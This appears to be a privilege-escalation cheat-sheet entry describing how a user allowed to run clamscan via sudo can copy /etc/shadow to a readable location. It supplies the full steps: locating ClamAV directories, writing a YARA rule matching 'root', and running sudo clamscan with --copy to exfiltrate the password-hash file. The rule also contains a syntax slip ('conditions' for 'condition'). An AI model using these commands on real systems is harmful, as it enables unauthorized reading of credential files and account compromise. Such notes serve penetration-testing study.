---
title: Sudo ClamAV Privilege Escalation
description: Sudo clamscan command might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

If we can execute **“clamscan”** command as root as below,

```bash
sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
```

we can read sensitive files by applying the custom yara rule.  

<br />

## Exploitation

### 1. Create a Yara Rule

First off, check the location in which the yara file can be created.

```bash
find / -name "clam*" 2>/dev/null
```

For instance, assume we can create the yara file under **/var/lib/clamav/**.  
Create the yara rule in there.  
Assume we want to read /etc/shadow, so specify the string **“root”** because the /etc/shadow contains “root” user name.

```bash
# /var/lib/clamav/test.yara
rule test
{
  strings:
    $string = "root"
  conditions:
    $string
}
```

### 2. Execute ClamScan

Now execute **"clamscan"** as root.

```bash
sudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results
```

We can see **/etc/shadow** under **/tmp/results**.
